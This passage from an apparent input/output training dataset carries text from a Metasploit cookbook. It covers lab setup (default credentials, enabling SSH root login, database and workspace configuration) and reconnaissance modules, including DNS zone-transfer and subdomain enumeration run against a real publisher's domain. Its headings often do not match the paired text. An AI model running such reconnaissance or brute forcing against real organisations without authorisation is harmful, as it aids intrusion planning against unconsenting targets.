the\nusername and password. The default username for the root user is root and the\npassword is toor.\n2. Upon successful login, the easiest way to get the Metasploit Framework up and\nrunning is to start Metasploit from the Applications menu.\n[ 15 ]\nMetasploit Quick Tips for Security Professionals Chapter 1\n3. To launch Metasploit from the Applications menu, go to Applications |\nExploitation Tools | metasploit framework, as shown in the following\nscreenshot:\nStarting Metasploit Framework from the Applications menu will\nautomatically set up the PostgreSQL database. It will create the database\nuser, the msf and msf_test databases, configure Metasploit to use the\ndatabase, create the database schema, and start msfconsole by running\nthe following command: service postgresql start && msfdb init\n&& msfconsole.\nCreating database user 'msf'\nEnter password for new role:\nEnter it again:\nCreating databases 'msf' and 'msf_test'\n[ 16 ]"
  },
  {
    "input": "Upgrading Kali Linux",
    "output": "Metasploit Quick Tips for Security Professionals Chapter 1\nCreating configuration file in /usr/share/metasploit-\nframework/config/database.yml\nCreating initial database schema\n# cowsay++\n____________\n< metasploit >\n------------\n\\ ,__,\n\\ (oo)____\n(__) )\\\n||--|| *\n=[ metasploit v4.16.8-dev- ]\n+ -- --=[ 1683 exploits - 964 auxiliary - 299 post ]\n+ -- --=[ 498 payloads - 40 encoders - 10 nops ]\n+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]\nmsf >\nThere's more...\nAlternatively, you can start the Metasploit Framework by typing msfconsole from a\nTerminal window.\nUpgrading Kali Linux\nAs a rolling distribution, upgrading Kali Linux is simple. It's recommended to upgrade Kali\nLinux regularly, to ensure that you will get the latest security updates. To upgrade, use apt\nupdate followed by apt upgrade; apt will look for installed packages that can be\nupgraded without removing any packages, this way being the least intrusive.\nFor major version upgrades and important upgrades, use apt full-upgrade; this will do\na complete upgrade and, if necessary, remove obsolete packages or install new\ndependencies.\n[ 17 ]"
  },
  {
    "input": "Getting ready",
    "output": "Metasploit Quick Tips for Security Professionals Chapter 1\nSetting up a penetration-testing lab\nCreating a penetration-testing lab is essential, it will allow you to practice and test new\ntechniques and exploits in a secure environment. Using virtual machines for your lab\nenvironment will give you portability, flexibility, and low maintenance. You can work\nsimultaneously on more than one operating system, set up complex network scenarios, and\nperform penetration tests on multiple targets. So, let's have a quick look at how we can set\nup a penetration-testing lab using virtualization.\nGetting ready\nFor your lab, you can use the hypervisor of your choice; the most common hypervisors\nare VirtualBox, VMware Workstation Pro, VMware Fusion Pro (for Mac), VMware ESXi,\nand Microsoft Hyper-V. For the penetration testing lab used in this book, I would\nrecommend you to use VirtualBox since it is an open source hypervisor and a requirement\nfor building one of the virtual machines.\nAlthough you need to build the virtual machine using VirtualBox, after\nbuilding the machine you can import it to any of the hypervisors you like.\nThis is the network diagram for the penetration-testing lab:\nWe will use four virtual machines with Kali Linux, a Linux server, a Windows server, and a\nWindows 10 client. In this lab, we have a modern scenario that will allow us to test and\npractice the latest techniques and exploits.\n[ 18 ]"
  },
  {
    "input": "How to do it...",
    "output": "Metasploit Quick Tips for Security Professionals Chapter 1\nHow to do it...\nFor the Kali Linux machine, the Linux server, and the Windows 10 client, the setup is\nsimple. We can download the Kali Linux virtual machine from the official site, https:/​/\nwww.​kali.​org/​downloads/​; for the Linux server, we will use the Metasploitable 2 machine\nwhich you can download from SourceForge at https:/​/​sourceforge.​net/​projects/\nmetasploitable/​files/​Metasploitable2/​; and for the Windows 10 client, we can\ndownload a 90-day trial from the Microsoft Developer site at https:/​/​developer.\nmicrosoft.​com/​en-​us/​microsoft-​edge/​tools/​vms/​.\nFor the last machine, we will use Metasploitable 3, a Windows virtual machine that we will\nbuild, with many security vulnerabilities for us to test. To build the Metasploitable 3\nmachine, we have to install Packer, Vagrant, the Vagrant Reload plugin, and\nVirtualBox. The build scripts and documentation, as well as the most up-to-date build\ninstructions, can be found at the official GitHub repository: https:/​/​github.​com/​rapid7/\nmetasploitable3. To build the machine automatically, perform the following steps:\n1. Run the build_win2008.sh script if using Bash, or build_win2008.ps1 if\nusing Windows.\n2. Upon successful completion, run vagrant up.\n3. When the process completes, you should be able to open the VM within\nVirtualBox and log in using the username vagrant and password vagrant.\nBefore you start your virtual machines, there is an important configuration that you will\nhave to make in order to set up the network communication for the lab:\n1. Select the Kali Linux virtual machine and click on Settings. Then, move to\nRemovable Devices. In the Network Adapter option, the network adapter\nshould be configured to use Internet Sharing | Share with my Mac, which will\nallow the virtual machine to access the internet, sharing the IP address of the host\nmachine, since it will provide Network Address Translation (NAT) for network\ntraffic from the virtual machine.\n[ 19 ]\nMetasploit Quick Tips for Security Professionals Chapter 1\n2. The network adapter of the Metasploitable 3 virtual machine and the first\nnetwork adapter of the Metasploitable 2 virtual machine should also be\nconfigured to use NAT:\n3. In VMware Fusion, go to Preferences, select the Network tab, and create a\ncustom network. Check the box to provide addresses on this network via DHCP;\nuse the Subnet IP of 10.0.0.0 and the Subnet Mask of 255.255.255.0:\n[ 20 ]\nMetasploit Quick Tips for Security Professionals Chapter 1\n[ 21 ]\nMetasploit Quick Tips for Security Professionals Chapter 1\n4. Now that you have created the custom network, select the Windows 10 virtual\nmachine, click on Settings, then go to the Network Adapter settings. Choose\nCustom network and select the custom network we have created. Repeat the\nprocess for the second Network Adapter of the Metasploitable 2 virtual machine:\n5. To verify the configuration, log in to the Metasploitable 2 machine and use the ip\na command. The default username for the root user is msfadmin and the\npassword is msfadmin:\n[ 22 ]"
  },
  {
    "input": "How to do it...",
    "output": "Metasploit Quick Tips for Security Professionals Chapter 1\nHow it works...\nBy creating two NAT networks, we can simulate internet-facing servers using the first NAT\nnetwork and internal machines using the custom network we have created, thus providing\na more realistic scenario, and giving you the possibility to learn how to do reconnaissance\nof internal targets, pivoting, and lateral movement.\nSetting up SSH connectivity\nSecure Shell (SSH) allows you to connect to a remote host securely over an unsecured\nnetwork.\nGetting ready\nTo configure the Kali Linux machine for remote logins, we will start by changing the default\nroot password and generating new SSH host keys.\nHow to do it...\nTo change the root password, use the passwd command as follows:\nroot@kali:~# passwd\nEnter new UNIX password:\nRetype new UNIX password:\npasswd: password updated successfully\nTo generate new SSH host keys, the steps are also relatively straightforward: remove the\ncurrent SSH host keys, use the dpkg-reconfigure openssh-server command to\nreconfigure the OpenSSH server, and generate new SSH host keys:\nroot@kali:~# rm /etc/ssh/ssh_host_*\nroot@kali:~# dpkg-reconfigure openssh-server\nCreating SSH2 RSA key; this may take some time ...\n2048 SHA256:Ok/J4YvIGYieDI6YuOLDXADm5YUdrJSnzBKguuD9WWQ root@kali (RSA)\nCreating SSH2 ECDSA key; this may take some time ...\n256 SHA256:eYU5TtQVzFYQtjo6lyiVHku6SQWbgkMPMDtW8cgaAJ4 root@kali (ECDSA)\nCreating SSH2 ED25519 key; this may take some time ...\n256 SHA256:8nj2LMKQNOLKS9S9OsWcBArslPgpFfD/5h4vNrwI4sA root@kali (ED25519)\n[ 23 ]"
  },
  {
    "input": "Connecting to Kali using SSH",
    "output": "Metasploit Quick Tips for Security Professionals Chapter 1\nFor lab purposes, we'll edit the OpenSSH server configuration\n/etc/ssh/sshd_config file to permit root login by changing the\nline #PermitRootLogin without-password to PermitRootLogin yes as you can see in\nthe following example:\n...\n# Authentication:\n#LoginGraceTime 2m\nPermitRootLogin yes\n#StrictModes yes\n#MaxAuthTries 6\n#MaxSessions 10\n...\nTo start the OpenSSH service automatically on boot, run the systemctl enable ssh and\nfinish the configuration by restarting the service using the systemctl restart\nssh command, as follows:\nroot@kali:~# systemctl enable ssh\nSynchronizing state of ssh.service with SysV service script with\n/lib/systemd/systemd-sysv-install.\nExecuting: /lib/systemd/systemd-sysv-install enable ssh\nroot@kali:~# systemctl restart ssh\nroot@kali:~#\nThis is fine for a lab environment but when performing penetration tests\nconfigure SSH to use cryptographic keys for logging in to the Kali Linux\nmachine. This is much more secure than using only a password.\nConnecting to Kali using SSH\nTo connect to the Kali machine, all we need is an SSH client. Most Unix, Linux, and macOS\noperating systems already have an SSH client installed; however, if you are using Windows\nto connect to the Kali Linux machine, you will need to install a client such as PuTTY, which\nis one of the most popular and free SSH clients for Windows.\n[ 24 ]"
  },
  {
    "input": "How to do it...",
    "output": "Metasploit Quick Tips for Security Professionals Chapter 1\nHow to do it...\n1. To connect to the Kali Linux virtual machine, you need to know its IP address. To\nfind the IP address, log in to the virtual machine, open a Terminal window, and\nenter the ip address command, or ip a for short:\nroot@kali:~# ip a\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN\ngroup default qlen 1000\nlink/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\ninet 127.0.0.1/8 scope host lo\nvalid_lft forever preferred_lft forever\ninet6 ::1/128 scope host\nvalid_lft forever preferred_lft forever\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc\npfifo_fast state UP group default qlen 1000\nlink/ether 00:0c:29:b6:03:93 brd ff:ff:ff:ff:ff:ff\ninet 192.168.216.5/24 brd 192.168.216255 scope global eth0\nvalid_lft forever preferred_lft forever\ninet6 fe80::20c:29ff:feb6:393/64 scope link\nvalid_lft forever preferred_lft forever\nNote down the IP address of the second interface, in this example\n192.168.216.5.\n2. Now, use the SSH client on the host operating system. Enter the username root\nfollowed by the @ symbol and the IP address of the Kali Linux virtual\nmachine, 192.168.216.5:\n[ 25 ]"
  },
  {
    "input": "How to do it...",
    "output": "Metasploit Quick Tips for Security Professionals Chapter 1\nIn this SSH session, we can now interact with the Kali Linux virtual machine\nusing the SSH client.\nYou will need to verify the SSH certificate after you launch the connection.\nConfiguring PostgreSQL\nAn important feature of Metasploit is the backend database support for PostgreSQL, which\nyou can use to store your penetration-testing results. Any penetration test consists of lots of\ninformation and can run for several days, so it becomes essential to store the intermediate\nresults and findings, such as target host data, system logs, collected evidence, and report\ndata. As a good penetration-testing tool, Metasploit has proper database integration to store\nthe results quickly and efficiently. In this recipe, we will be dealing with the installation and\nconfiguration process of a database in Kali Linux.\nGetting ready\nTo configure PostgreSQL, we will first start the service and then use the Metasploit msfdb\ncommand to initialize the database.\nHow to do it...\n1. To set up our Metasploit database, we first need to start up the PostgreSQL\nserver, using the following command:\nroot@kali:~# systemctl start postgresql\n2. Then we need to create and initialize the msf database with the msfdb command\nwith the init option:\nroot@kali:~# msfdb init\nCreating database user 'msf'\nEnter password for new role:\nEnter it again:\nCreating databases 'msf' and 'msf_test'\nCreating configuration file in /usr/share/metasploit-\n[ 26 ]\nMetasploit Quick Tips for Security Professionals Chapter 1\nframework/config/database.yml\nCreating initial database schema\nThe msfdb command allows you to manage the Metasploit Framework database,\nnot just initialize the database. To display all the msfdb options, run the command\nas follows:\nroot@kali:~# msfdb\nManage a metasploit framework database\nmsfdb init # initialize the database\nmsfdb reinit # delete and reinitialize the database\nmsfdb delete # delete database and stop using it\nmsfdb start # start the database\nmsfdb stop # stop the database\n3. To modify the database configuration file, we can edit the database.yml file\nlocated in /usr/share/metasploit-framework/config/database.yml:\nroot@kali:~# cat /usr/share/metasploit-\nframework/config/database.yml\ndevelopment:\nadapter: postgresql\ndatabase: msf\nusername: msf\npassword: 3HcNhAtdH6F9F2iGa4z3wJVoI7UK1Ot+MG1zuKjYzn4=\nhost: localhost\nport: 5432\npool: 5\ntimeout: 5\nproduction:\nadapter: postgresql\ndatabase: msf\nusername: msf\npassword: 3HcNhAtdH6F9F2iGa4z3wJVoI7UK1Ot+MG1zuKjYzn4=\nhost: localhost\nport: 5432\npool: 5\ntimeout: 5\ntest:\nadapter: postgresql\ndatabase: msf_test\nusername: msf\npassword: 3HcNhAtdH6F9F2iGa4z3wJVoI7UK1Ot+MG1zuKjYzn4=\n[ 27 ]"
  },
  {
    "input": "There's more...",
    "output": "Metasploit Quick Tips for Security Professionals Chapter 1\nhost: localhost\nport: 5432\npool: 5\ntimeout: 5\nNotice the default username, password, and default database that has been\ncreated. If necessary, you can also change these values according to your\npreference.\n4. Now, let's launch the msfconsole interface and confirm that Metasploit is\nsuccessfully connected to the database using the db_status command:\nmsf > db_status\n[*] postgresql connected to msf\nThere's more...\nTo connect to a database manually, you can use the db_connect command followed by the\ncredentials, host, and database you want to connect to, using the following syntax:\ndb_connect <user:pass>@<host:port>/<database>\nTo test the db_connect command, we can use the values of the username, password,\ndatabase name, and port number, from the database.yml file:\nmsf > db_disconnect\nmsf > db_status\n[*] postgresql selected, no connection\nmsf > db_connect\nmsf:3HcNhAtdH6F9F2iGa4z3wJVoI7UK1Ot+MG1zuKjYzn4=@127.0.0.1/msf\n[*] Rebuilding the module cache in the background...\nmsf > db_status\n[*] postgresql connected to msf\nWe can also use db_connect with the -y option and the path to the database configuration\nfile:\nmsf > db_disconnect\nmsf > db_status\n[*] postgresql selected, no connection\nmsf > db_connect -y /usr/share/metasploit-framework/config/database.yml\n[*] Rebuilding the module cache in the background...\nmsf > db_status\n[*] postgresql connected to msf\n[ 28 ]"
  },
  {
    "input": "How to do it...",
    "output": "Metasploit Quick Tips for Security Professionals Chapter 1\nIf you want the database to connect every time you launch msfconsole, copy the database\nconfiguration file to the .msf4 directory which was created in your home directory by the\nMetasploit installer.\nCreating workspaces\nWorkspaces in Metasploit are used to separate datasets, allowing you to stay organized. It is\na good idea to create a new workspace to organize all your collected data before starting a\nnew penetration test, thereby avoiding contamination by previous tests.\nHow to do it...\n1. The default workspace is selected when connecting to the database, which is\nrepresented by the * character before its name:\nmsf > workspace\n* default\n2. To display the usage for the workspace command, use the -h option as follows:\nmsf > workspace -h\nUsage:\nworkspace List workspaces\nworkspace -v List workspaces verbosely\nworkspace [name] Switch workspace\nworkspace -a [name] ... Add workspace(s)\nworkspace -d [name] ... Delete workspace(s)\nworkspace -D Delete all workspaces\nworkspace -r <old> <new> Rename workspace\nworkspace -h Show this help information\n3. To add a new workspace, use the -a option followed by the name of the\nworkspace:\nmsf > workspace -a book\n[*] Added workspace: book\n[ 29 ]"
  },
  {
    "input": "Getting ready",
    "output": "Metasploit Quick Tips for Security Professionals Chapter 1\n4. To list the available workspaces, simply type the workspace command:\nmsf > workspace\ndefault\n* book\n5. To delete a workspace, use the -d option followed by the name of the workspace:\nmsf > workspace -d book\n[*] Deleted workspace: book\n[*] Switched workspace: default\n6. To change the current workspace, use the workspace command followed by the\nname of the workspace you want to change to:\nmsf > workspace book\n[*] Workspace: book\n7. To rename a workspace, use the workspace command with the -r option\nfollowed by the old workspace name and the new workspace name:\nmsf > workspace -r book metasploit\n[*] Switched workspace: metasploit\nUsing the database\nOnce the database is configured, we can start using it. First, we will take a look at how to\nimport data from external tools using the db_import command.\nGetting ready\nTo view how to use the command and list the currently supported file types in\nmsfconsole, run the db_import command:\nmsf > db_import\nUsage: db_import <filename> [file2...]\n​\nFilenames can be globs like *.xml, or **/*.xml which will search\nrecursively\nCurrently supported file types include:\nAcunetix\nAmap Log\n[ 30 ]"
  },
  {
    "input": "How to do it...",
    "output": "Metasploit Quick Tips for Security Professionals Chapter 1\nAmap Log -m\nAppscan\nBurp Session XML\nBurp Issue XML\n...\nQualys Asset XML\nQualys Scan XML\nRetina XML\nSpiceworks CSV Export\nWapiti XML\nHow to do it...\n1. To test the db_import command, we will use the nmap command, a free security\nscanner, port scanner, and network exploration tool, with the -oX option to save\nthe result to an XML file. Here is the syntax used to scan the Metasploitable 3\ntarget machine:\nnmap -Pn -A -oX report 192.168.216.10\n2. To import the scan report, you can use the db_import command followed by the\npath to the report you want to import:\nmsf > db_import /root/report\n[*] Importing 'Nmap XML' data\n[*] Import: Parsing with 'Nokogiri v1.8.0'</strong>\n[*] Importing host 192.168.216.10\n[*] Successfully imported /root/report\nAlternatively, you can run the db_nmap command directly from msfconsole, and\nthe results will be saved in your current database. The db_nmap command works\nthe same way as the regular nmap command:\nmsf > db_nmap -Pn -A 192.168.216.129\n[*] Nmap: Starting Nmap 7.60 ( https://nmap.org ) at 2017-10-17\n05:05 EDT\n[*] Nmap: Nmap scan report for 192.168.216.129\n[*] Nmap: Host is up (0.00092s latency).\n[*] Nmap: Not shown: 977 closed ports\n[*] Nmap: PORT STATE SERVICE VERSION\n[*] Nmap: 21/tcp open ftp vsftpd 2.3.4\n[*] Nmap: |_ftp-anon: Anonymous FTP login allowed (FTP code 230)\n[ 31 ]"
  },
  {
    "input": "How to do it...",
    "output": "Metasploit Quick Tips for Security Professionals Chapter 1\n[*] Nmap: | ftp-syst:\n[*] Nmap: | STAT:\n...\n[*] Nmap: |_ System time: 2017-10-04T09:11:38-04:00\n[*] Nmap: |_smb2-time: Protocol negotiation failed (SMB2)\n[*] Nmap: TRACEROUTE\n[*] Nmap: HOP RTT ADDRESS\n[*] Nmap: 1 0.92 ms 192.168.216.129\n[*] Nmap: OS and Service detection performed. Please report any\nincorrect results at https://nmap.org/submit/ .\n[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 31.88\nseconds\nUsing the hosts command\nNow that we have data in the database, we can start by using the hosts command to\ndisplay all the hosts stored in our current workspace:\nHow to do it...\n1. Issuing the hosts command with -h will display the help menu:\nmsf > hosts -h\nUsage: hosts [ options ] [addr1 addr2 ...]\n​\nOPTIONS:\n-a,--add Add the hosts instead of searching\n[ 32 ]\nMetasploit Quick Tips for Security Professionals Chapter 1\n-d,--delete Delete the hosts instead of searching\n-c <col1,col2> Only show the given columns (see list below)\n-h,--help Show this help information\n-u,--up Only show hosts which are up\n-o <file> Send output to a file in csv format\n-O <column> Order rows by specified column number\n-R,--rhosts Set RHOSTS from the results of the search\n-S,--search Search string to filter by\n-i,--info Change the info of a host\n-n,--name Change the name of a host\n-m,--comment Change the comment of a host\n-t,--tag Add or specify a tag to a range of hosts\n​\nAvailable columns: address, arch, comm, comments, created_at,\ncred_count, detected_arch, exploit_attempt_count,\nhost_detail_count, info, mac, name, note_count, os_family,\nos_flavor, os_lang, os_name, os_sp, purpose, scope, service_count,\nstate, updated_at, virtual_host, vuln_count, tags\n2. Using the -c option, we can select which columns to display:\n[ 33 ]"
  },
  {
    "input": "Understanding the services command",
    "output": "Metasploit Quick Tips for Security Professionals Chapter 1\n3. With the -S option, we can search for specific strings, such as the OS name:\nUnderstanding the services command\nThe services command allows us to display the services running on the hosts. To view the\nhelp for the services command, we can use the -h option:\nmsf > services -h\nUsage: services [-h] [-u] [-a] [-r <proto>] [-p <port1,port2>] [-s\n<name1,name2>] [-o <filename>] [addr1 addr2 ...]\n-a,--add Add the services instead of searching\n-d,--delete Delete the services instead of searching\n-c <col1,col2> Only show the given columns\n-h,--help Show this help information\n-s <name1,name2> Search for a list of service names\n-p <port1,port2> Search for a list of ports\n-r <protocol> Only show [tcp|udp] services\n-u,--up Only show services which are up\n-o <file> Send output to a file in csv format\n-O <column> Order rows by specified column number\n-R,--rhosts Set RHOSTS from the results of the search\n-S,--search Search string to filter by\nAvailable columns: created_at, info, name, port, proto, state, updated_at\n[ 34 ]"
  },
  {
    "input": "How to do it...",
    "output": "Metasploit Quick Tips for Security Professionals Chapter 1\nHow to do it...\n1. Using the search command without any options displays all the available\nservices:\n2. The services command allows us to filter the stored information\nwith granularity, allowing us to search for a specific service name:\n[ 35 ]\nMetasploit Quick Tips for Security Professionals Chapter 1\n3. Search for a port number as follows:\n4. Like the hosts command, we can use the -S option to search for specific strings:\n[ 36 ]\nMetasploit Quick Tips for Security Professionals Chapter 1\n5. By combining multiple options, you can search just a specific host and only\ndisplay the columns you want:\nIn later chapters, we will address the remaining database commands, such\nas loot, creds, vulns, and notes.\n[ 37 ]"
  },
  {
    "input": "Chapter 2: Information Gathering and Scanning",
    "output": "2\nInformation Gathering and\nScanning\nIn this chapter, we will cover the following recipes:\nPassive information gathering with Metasploit\nActive information gathering with Metasploit\nPort scanning—the Nmap way\nPort scanning—the db_nmap way\nHost discovery with ARP Sweep\nUDP Service Sweeper\nSMB scanning and enumeration\nDetecting SSH versions with the SSH Version Scanner\nFTP scanning\nSMTP enumeration\nSNMP enumeration\nHTTP scanning\nWinRM scanning and brute forcing\nIntegrating with Nessus\nIntegrating with NeXpose\nIntegrating with OpenVAS"
  },
  {
    "input": "Introduction",
    "output": "Information Gathering and Scanning Chapter 2\nIntroduction\nInformation gathering is the first and one of the most, if not the most, important activities in\npenetration testing. This step is carried out in order to find out as much information about\nthe target machine as possible. The more information we have, the better our chances will\nbe for exploiting the target. During the information gathering phase, our main focus is to\ncollect facts about the target machine, such as the IP address, available services, and open\nports. This information plays a vital role in the process of penetration testing. To achieve\nthis goal, we will be learning certain scanning techniques such as SMB scanning, SSH server\nscanning, FTP scanning, SNMP enumeration, HTTP scanning, and WinRM scanning and\nbrute forcing by the end of this chapter.\nInformation gathering, footprinting, and enumeration are terms that are often used\ninterchangeably. But they are still different. According to the SANS standard, footprinting\nis the ability to obtain essential information about an organization. This information\nincludes the technologies that are being used, such as internet, intranet, remote access, and\nextranet. In addition to the technologies, the security policies and procedures must be\nexplored. Scanning consists of basic steps in mapping out whether a network is performing\nan automated ping sweep on a range of IP addresses and network blocks, to determine if\nindividual systems are alive. Enumeration involves active connections to a system and\ndirected queries. The type of information enumerated by hackers can be loosely grouped\ninto categories, such as network resources and shares, users and groups, applications and\nbanners, and network blocks.\nThere are basically three types of techniques used in information gathering:\nPassive information gathering: This technique is used to gain information about\nthe target, without having any physical connectivity or access to it. This means\nthat we use other sources to gain information about the target, such as by using\nthe whois query, Nslookup, and so on. Suppose our target is an online web\napplication; then, a simple whois lookup can provide us with a lot of information\nabout the web application, such as its IP address, its domains and subdomains,\nthe location of the server, the hosting server, and so on. This information can be\nvery useful during penetration testing as it can widen our track of exploiting the\ntarget.\nActive information gathering: In this technique, a logical connection is set up\nwith the target in order to gain information. This technique provides us with the\nnext level of information, which can directly supplement our understanding of\nthe target security. In port scanning, the target is the most widely used active\nscanning technique in which we focus on the open ports and available services\nrunning on the target.\n[ 39 ]"
  },
  {
    "input": "Getting ready",
    "output": "Information Gathering and Scanning Chapter 2\nSocial engineering: This type of information gathering is similar to passive\ninformation gathering but relies on human error, and the information leaked out\nin the form of printouts, telephone conversations, incorrect email IDs, and so on.\nThe techniques for utilizing this method are numerous and the ethos of\ninformation gathering is very different, hence, social engineering is a category in\nitself. For example, hackers register domain names that sound similar with\nspelling mistakes and set up a mail server to receive such erroneous emails. Such\ndomains are known as Doppelganger Domains; that is, the evil twin.\nThe victims of social engineering are tricked into releasing desired information\nthat they do not realize will be used to attack an enterprise network. For example,\nan employee in an enterprise may be tricked into revealing an employee\nidentification number to someone who is pretending to be someone he/she trusts.\nWhile that employee number may not seem valuable to the employee, which\nmakes it easier for him to reveal the information in the first place, the social\nengineer can use that employee number in conjunction with other information\nthat has been gathered to get closer to finding a way into the enterprise network.\nPassive information gathering with\nMetasploit\nIn this chapter, we will analyze the various passive and active techniques of information\ngathering in detail. From the beginning, we will analyze the most commonly used and most\ncommonly neglected techniques of passive information gathering and in later recipes, we\nwill focus on gaining information through port scanning. Metasploit has several built-in\nscanning capabilities, as well as some third-party tools integrated with it to further enhance\nthe process of port scanning. We will analyze both the inbuilt scanners, as well as some of\nthe popular third-party scanners which work over the Metasploit Framework. Let's move\non to the recipes and start our process of gaining information about our target.\nGetting ready\nWe will start information gathering with the company domain name, get information about\nthe company, search for subdomains, find targets, check for honeypots, gather email\naddresses, and much more.\n[ 40 ]"
  },
  {
    "input": "DNS Record Scanner and Enumerator",
    "output": "Information Gathering and Scanning Chapter 2\nHow to do it...\nThe Metasploit Framework has several modules for information gathering. In this recipe,\nyou will learn how to use some of these modules. However, I recommend that you explore\nall the auxiliary modules available in the framework.\nDNS Record Scanner and Enumerator\nThe DNS Record Scanner and Enumerator auxiliary module can be used to gather\ninformation about a domain from a given DNS server by performing various DNS queries,\nsuch as zone transfers, reverse lookups, SRV record brute forcing, and other techniques.\n1. To run the auxiliary module, we use the use command followed by the\nmodule we want to use, in this case, auxiliary/gather/enum_dns. Then we\ncan use the info command to display information about the module, such as the\nauthors, basic options, and description, as shown here:\n[ 41 ]"
  },
  {
    "input": "CorpWatch Company Name Information Search",
    "output": "Information Gathering and Scanning Chapter 2\n2. To run the module, we need to set the domain name, and to make it run a bit\nfaster, we will set the thread number to 10:\nmsf > use auxiliary/gather/enum_dns\nmsf auxiliary(enum_dns) > set DOMAIN packtpub.com\nDOMAIN => packtpub.com\nmsf auxiliary(enum_dns) > set THREADS 10\nTHREADS => 10\nmsf auxiliary(enum_dns) > run\n...\n[+] packtpub.com NS: dns3.easydns.org.\n[+] packtpub.com NS: dns2.easydns.net.\n[*] Attempting DNS AXFR for packtpub.com from dns1.easydns.com.\nW, [2017-10-17T10:04:14.963345 #5091] WARN -- : AXFR query,\nswitching to TCP\n...\ninclude:_spf.freshsales.io a:zgateway.zuora.com\ninclude:amazonses.com ~all\n[*] querying DNS SRV records for packtpub.com\n[*] Auxiliary module execution completed\nmsf auxiliary(enum_dns) >\nLooking at the output, we can see that we are able to obtain several DNS records from the\ntarget domain.\nThere's more...\nThe DNS Record Scanner and Enumerator auxiliary module can also be used for\nactive information gathering, using its brute forcing capabilities. By setting ENUM_BRT to\ntrue, it will brute force subdomains and hostnames via the supplied wordlist, which you\ncan customize by setting the WORDLIST option to the path of your wordlist.\nCorpWatch Company Name Information Search\nGathering company information is essential, and for that, we can use the CorpWatch\nCompany Name Information Search auxiliary module,\nauxiliary/gather/corpwatch_lookup_name, which will give us the company's name,\naddress, sector, and industry.\n[ 42 ]"
  },
  {
    "input": "Search Engine Subdomains Collector",
    "output": "Information Gathering and Scanning Chapter 2\nTo run the auxiliary/gather/corpwatch_lookup_name auxiliary module, we can use\nMicrosoft as the company name and set the limit to 1 to show only the first result:\nmsf > use auxiliary/gather/corpwatch_lookup_name\nmsf auxiliary(corpwatch_lookup_name) > set COMPANY_NAME Microsoft\nCOMPANY_NAME => Microsoft\nmsf auxiliary(corpwatch_lookup_name) > set LIMIT 1\nLIMIT => 1\nmsf auxiliary(corpwatch_lookup_name) > run\n[*] Company Information\n---------------------------------\n[*] CorpWatch (cw) ID): cw_4803\n[*] Company Name: MICROSOFT CORP\n[*] Address: ONE MICROSOFT WAY, REDMOND WA 98052-6399\n[*] Sector: Business services\n[*] Industry: Services-prepackaged software\n[*] Auxiliary module execution completed\nmsf auxiliary(corpwatch_lookup_name) >\nSearch Engine Subdomains Collector\nGathering subdomains is a great way to find new targets, and we can use the Search Engine\nSubdomains Collector auxiliary module,\nauxiliary/gather/searchengine_subdomains_collector, to gather subdomains\nabout a domain from Yahoo and Bing.\nTo gather subdomains from a target domain, we just need to set the target domain. Let's\nquickly perform a test on packtpub.com and analyze the output:\nmsf > use auxiliary/gather/searchengine_subdomains_collector\nmsf auxiliary(searchengine_subdomains_collector) > set TARGET packtpub.com\nTARGET => packtpub.com\nmsf auxiliary(searchengine_subdomains_collector) > run\n[*] Searching Bing for subdomains from domain:packtpub.com\n[*] Searching Yahoo for subdomains from domain:packtpub.com\n[+] domain:packtpub.com subdomain: www.packtpub.com\n[*] Searching Bing for subdomains from ip:83.166.169.231\n[*] Searching Yahoo for subdomains from ip:83.166.169.231\n...\n[+] domain:packtpub.com subdomain: www1.packtpub.com\n[*] Searching Bing for subdomains from ip:83.166.169.231\n[*] Searching Yahoo for subdomains from ip:83.166.169.231\n[ 43 ]"
  },
  {
    "input": "Censys Search",
    "output": "Information Gathering and Scanning Chapter 2\n[+] ip:83.166.169.231 subdomain: www.packtpub.com\n[+] ip:83.166.169.231 subdomain: www1.packtpub.com\n[+] ip:83.166.169.231 subdomain: www2.packtpub.com\n[*] Auxiliary module execution completed\nThe Search Engine Subdomains Collector auxiliary module helped us find new targets, such\nas www.packtpub.com, cdp.packtpub.com, authorportal.packtpub.com, among\nothers.\nNow that we have a good idea about the capabilities of some of the basic modules, let's try\nthe big guns.\nCensys Search\nCensys is a search engine that enables researchers to ask questions about the hosts and\nnetworks that compose the internet. Censys collects data on hosts and websites through\ndaily ZMap and ZGrab scans of the IPv4 address space, in turn maintaining a database of\nhow hosts and websites are configured.\nUsing the Censys search auxiliary module, we can use the Censys REST API to access the\nsame data accessible through the web interface. The search endpoint allows searches\nagainst the current data in the IPv4, top million websites, and certificates indexes, using the\nsame search syntax as the primary site.\nTo use the Censys Search auxiliary module, you first need to create a free\naccount at the https:/​/​censys.​io/​ website to get your API ID and secret.\nTo use the Censys Search auxiliary module, we will set the Censys dork to packtpub.com,\nthe search type to ipv4, followed by your secret and API ID, and type run to run the\nmodule:\nmsf > use auxiliary/gather/censys_search\nmsf auxiliary(censys_search) > set CENSYS_DORK packtpub.com\nCENSYS_DORK => packtpub.com\nmsf auxiliary(censys_search) > set CENSYS_SEARCHTYPE ipv4\nCENSYS_SEARCHTYPE => ipv4\nmsf auxiliary(censys_search) > set CENSYS_SECRET\nJIxvPzj0RJkqOqd9cFNRYqNkHzH7E3en\nCENSYS_SECRET => JIxvPzj0RJkqOqd9cFNRYqNkHzH7E3en\nmsf auxiliary(censys_search) > set CENSYS_UID ec421f73-\nd438-1c48-15b3-5de240bef531\nCENSYS_UID => ec421f73-d438-1c48-15b3-5de240bef531\n[ 44 ]"
  },
  {
    "input": "Shodan Search",
